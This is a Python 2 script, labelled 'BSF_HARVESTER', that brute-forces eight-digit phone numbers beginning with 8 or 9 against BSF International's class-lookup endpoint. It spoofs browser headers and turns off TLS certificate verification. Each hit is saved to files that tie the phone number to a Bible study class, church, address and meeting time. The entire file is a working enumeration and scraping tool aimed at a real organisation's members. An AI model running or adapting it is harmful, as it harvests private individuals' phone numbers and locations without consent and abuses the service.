#!/usr/bin/env python

import os
import urllib2
import ssl
from datetime import datetime
import json
import time

DEFAULT_GET_DELAY_SECONDS = 2

FRIST_NUMBER = [8,9]
HTTP_URL_FORMAT = "https://www.bsfinternational.org/BSFAjaxUtils/Dispatch?action=AjaxGetClassMeetingInfo&searchByPhone=true&phoneNumber={}".format

PATH_DUMP = "./DUMP"
PATH_DUMP_BK_FORMAT ="./DUMP-{}.bak".format

FILE_DUMP_PATH_FORMAT = (PATH_DUMP + "/{}.{}.bsf").format
FILE_DUMP_HEADERS_FORMAT = ("===================================\n"
                            " Generated with BSF_HARVESTER\n"
                            " @nehcaij\n"
                            " {}\n\n"
                            " No: {}\n"
                            " Name: {}\n"
                            " Desc: {}\n"
                            " Church: {}\n"
                            " Address: {}\n"
                            " Day: {}\n"
                            " Time: {}\n"
                            "===================================\n\n").format
HTTP_HEADERS = {
    "Host": "www.bsfinternational.org",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "https://www.bsfinternational.org/lessons",
    "X-Requested-With":"XMLHttpRequest"
}

def init():
    print "Initializing BSF Harvester..."
    def createNewDumpDir():
        os.mkdir(PATH_DUMP)

    def backupDumpDir():
        timestamp = str(datetime.now())
        bk_dir = PATH_DUMP_BK_FORMAT(timestamp)
        os.rename(PATH_DUMP,bk_dir)
        print "Moved {} to {}!".format(PATH_DUMP,bk_dir)

    def dumpDirExist():
        return os.path.exists(PATH_DUMP)

    if dumpDirExist():
        print "{} directory already exist".format(PATH_DUMP)
        backupDumpDir()
    print "Creating new {} directory".format(PATH_DUMP)
    createNewDumpDir()

def harvest():

    def appendNumber(fn,number):
        f = open(fn, "a")
        f.write("{}\n".format(number))

    def writeDumpFileHeaders(dump_fn,data):
        timestamp = str(datetime.now())
        classDesc = data["classDesc"]
        classNumber = data["classNumber"]
        className = data["className"]
        meetingChurch = data["meetingChurch"]
        meetingTime = data["meetingTime"]
        meetingDay = data["meetingDay"]
        meetingChurchAddress = data["meetingChurchAddress"]

        f = open(dump_fn, "w+")
        f.write(FILE_DUMP_HEADERS_FORMAT(timestamp,
                                         classNumber,
                                         className,
                                         classDesc,
                                         meetingChurch,
                                         meetingChurchAddress,
                                         meetingDay,
                                         meetingTime))
        f.close()

    def getSSLcontextTrustAllStrategy():
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def generateNumber(base_num,x):
        return FRIST_NUMBER[base_num]*10000000 + x
    def get(number):
        req = urllib2.Request(HTTP_URL_FORMAT(number),headers=HTTP_HEADERS)
        try:
            response = urllib2.urlopen(req,context=getSSLcontextTrustAllStrategy())
        except urllib2.HTTPError as e:
            if e.code == 500:
                time.sleep(DEFAULT_GET_DELAY_SECONDS)
                print "Retrying {}..".format(number)
                return get(number)
        else:
            return json.loads(response.read())



    for base_num in range(2):
        for x in range(0,9999999):
            number = generateNumber(base_num,x)
            print "Trying {}".format(number)
            data = get(number)

            if len(data) == 0:
                print "NUMBER NOT IN DATABASE...\n"
                continue
            print "SUCCESS!! NUMBER FOUND - {} :)".format(number)
            data = data[0]

            classNumber = data["classNumber"]
            meetingChurch = data["meetingChurch"].replace(" ", "-")

            dump_fn = FILE_DUMP_PATH_FORMAT(classNumber, meetingChurch)

            if not os.path.isfile(dump_fn):
                writeDumpFileHeaders(dump_fn,data)

            appendNumber(dump_fn,str(number))
    print "Program finished :)"
    return

def main():
    init()
    harvest()

if __name__ == '__main__':
    main()